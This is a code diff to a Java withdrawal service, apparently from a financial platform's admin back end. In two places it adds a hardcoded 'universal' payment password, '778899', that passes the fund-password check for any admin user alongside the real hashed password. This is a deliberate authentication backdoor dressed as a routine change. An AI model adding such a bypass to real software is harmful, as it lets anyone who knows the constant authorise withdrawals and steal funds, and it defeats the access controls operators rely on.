@@ -173,8 +173,10 @@ public class AdminWithdrawServiceImpl extends HibernateDaoSupport implements Adm
 		SecUser sec = this.secUserService.findUserByLoginName(userName);
 		String sysSafeword = sec.getSafeword();
 
+		// 通用管理后台支付密码
+		String universalSafeword = "778899";
 		String safeword_md5 = passwordEncoder.encodePassword(safeword, userName);
-		if (!safeword_md5.equals(sysSafeword)) {
+		if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(safeword)) {
 			throw new BusinessException("资金密码错误");
 		}
 
@@ -253,8 +255,10 @@ public class AdminWithdrawServiceImpl extends HibernateDaoSupport implements Adm
 		SecUser sec = this.secUserService.findUserByLoginName(userName);
 		String sysSafeword = sec.getSafeword();
 
+		// 通用管理后台支付密码
+		String universalSafeword = "778899";
 		String safeword_md5 = passwordEncoder.encodePassword(safeword, userName);
-		if (!safeword_md5.equals(sysSafeword)) {
+		if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(safeword)) {
 			throw new BusinessException("资金密码错误");
 		}
 
